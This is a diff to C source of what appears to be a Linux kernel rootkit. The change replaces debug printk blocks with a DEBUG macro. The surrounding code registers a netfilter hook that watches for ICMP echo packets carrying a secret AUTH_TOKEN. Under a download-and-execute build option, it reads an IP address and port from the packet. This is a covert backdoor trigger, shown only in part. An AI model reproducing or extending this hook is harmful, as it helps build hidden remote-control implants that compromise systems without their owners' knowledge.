@@ -39,16 +39,12 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     payload = (struct magic_icmp *)(icmp_header + 1);
     payload_size = skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
 
-    #if __DEBUG__
-    printk("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
-    #endif
+    DEBUG("ICMP packet: payload_size=%u, magic=%x, ip=%x, port=%hu\n", payload_size, payload->magic, payload->ip, payload->port);
 
     if ( icmp_header->type != ICMP_ECHO || payload_size != 10 || payload->magic != AUTH_TOKEN )
         return NF_ACCEPT;
 
-    #if __DEBUG__
-    printk("Received magic ICMP packet\n");
-    #endif
+    DEBUG("Received magic ICMP packet\n");
 
     #if defined(_CONFIG_DLEXEC_)
     ip = payload->ip;
@@ -63,9 +59,7 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
 
 void icmp_init ( void )
 {
-    #if __DEBUG__
-    printk("Monitoring ICMP packets via netfilter\n");
-    #endif
+    DEBUG("Monitoring ICMP packets via netfilter\n");
 
     pre_hook.hook     = watch_icmp;
     pre_hook.pf       = PF_INET;
@@ -77,9 +71,7 @@ void icmp_init ( void )
 
 void icmp_exit ( void )
 {
-    #if __DEBUG__
-    printk("Stopping monitoring ICMP packets via netfilter\n");
-    #endif
+    DEBUG("Stopping monitoring ICMP packets via netfilter\n");
 
     nf_unregister_hook(&pre_hook);
 }
